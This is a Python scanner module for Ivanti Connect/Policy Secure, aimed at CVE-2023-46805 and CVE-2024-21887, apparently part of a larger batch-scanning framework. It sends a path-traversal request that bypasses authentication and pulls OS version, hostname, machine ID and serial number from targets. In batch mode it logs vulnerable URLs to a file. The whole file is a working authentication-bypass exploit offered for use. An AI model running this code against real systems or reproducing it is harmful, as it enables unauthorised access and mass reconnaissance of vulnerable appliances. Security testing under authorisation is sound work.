#!/user/bin/env python3
# -*- coding: utf-8 -*-
import requests,urllib3
from libs.outprint import OutPrintInfo,OutPrintInfoSuc,OutPrintInfoErr
from libs.reqset import ReqSet
from libs.output import OutPutFile
urllib3.disable_warnings()
class Cve_2024_21887:
    def check_vulnerability(self,url):
        try:
            response = requests.get(
                url + "/api/v1/configuration/users/user-roles/user-role/rest-userrole1/web/web-bookmarks/bookmark",
                verify=self.ssl,headers=self.headers, proxies=self.proxy)

            if response.status_code == 403 and len(response.text) == 0:
                final_url = f"{url}/api/v1/totp/user-backup-code/%2e%2e/%2e%2e/system/system-information"
                system_info = requests.get(final_url, verify=self.ssl,headers=self.headers, proxies=self.proxy)
                if not self.batch:
                    OutPrintInfoSuc("Ivanti","Target is VULNERABLE")
                    OutPrintInfo("Ivanti","SYSTEM INFORMATION")
                    OutPrintInfo("Ivanti","--------------------------")
                    system_info_json = system_info.json()
                    OutPrintInfo("Ivanti","OS NAME:       " + system_info_json["rollback-partition-information"]["os-name"])
                    OutPrintInfo("Ivanti","OS VERSION:    " + system_info_json["rollback-partition-information"]["os-version"])
                    OutPrintInfo("Ivanti","HOSTNAME:      " + system_info_json["system-information"]["host-name"])
                    OutPrintInfo("Ivanti","MACHINE ID:    " + system_info_json["system-information"]["machine-id"])
                    OutPrintInfo("Ivanti","SERIAL NUMBER: " + system_info_json["system-information"]["serial-number"])
                else:
                    OutPrintInfoSuc("Ivanti", f'目标存在漏洞: {url}')
                    OutPutFile("ivanti_policy_secure_rce.txt",f'目标存在Ivanti policy secure 命令注入漏洞: {url}')
            else:
                if not self.batch:
                    OutPrintInfo("Ivanti","Target is NOT VULNERABLE")

        except requests.RequestException as e:
            if not self.batch:
                OutPrintInfo("Ivanti",f"Error: {e}")
    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        header = target["header"]
        self.ssl = target["ssl"]
        proxy = target["proxy"]
        if not self.batch:
            req = ReqSet(header=header, proxy=proxy)
            self.proxy = req["proxy"]
            self.headers = req["header"]
        else:
            self.proxy = {"http": proxy, "https": proxy}
            req = ReqSet(header=header)
            self.headers = req["header"]
        if not self.batch:
            print("\033[94m==============================================")
            print("CVE-2023-46805 and CVE-2024-21887 Scanner")
            print("Twitter: @ramin_karimhani")
            print("==============================================\033[0m")
            OutPrintInfo("Ivanti", '开始检测Ivanti policy secure 命令注入漏洞...')
        self.check_vulnerability(url)

        if not self.batch:
            OutPrintInfo("Ivanti", 'Ivanti policy secure 命令注入漏洞检测结束')



